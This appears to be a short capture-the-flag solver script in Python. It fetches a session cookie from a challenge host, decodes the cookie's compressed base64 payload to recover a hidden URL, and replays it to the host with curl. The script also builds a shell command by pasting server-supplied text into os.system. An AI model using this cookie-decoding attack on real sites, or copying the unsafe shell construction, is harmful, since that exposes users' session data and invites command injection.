import os
import urllib.request
import zlib,base64
import json
import sys

target ="http://lc.flu.cc:9991" 
req = urllib.request.Request(
    url=target+"/a?z=a", 
    data=None, 
    headers={
        'User-Agent': 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5'
    }
)
d = urllib.request.urlopen(req)
kue = d.getheader('Set-Cookie').split(";")

arg = str(kue[0]).split(".")
hasil = zlib.decompress(base64.urlsafe_b64decode(arg[1]+"=="))
decodehasil = json.loads(hasil)

paramnya = base64.urlsafe_b64decode(str(decodehasil['scheme'][' b'])).decode("utf-8")+"://"+base64.urlsafe_b64decode(str(decodehasil['netloc'][' b'])).decode("utf-8") +base64.urlsafe_b64decode(str(decodehasil['path'][' b'])).decode("utf-8") +"?"+base64.urlsafe_b64decode(str(decodehasil['query'][' b'])).decode("utf-8") +"%23"+base64.urlsafe_b64decode(str(decodehasil['fragment'][' b'])).decode("utf-8") 

os.system('curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" "'+target+'/terserah?z='+paramnya+'" --cookie "'+str(kue[0])+'" -v')
print('\n')

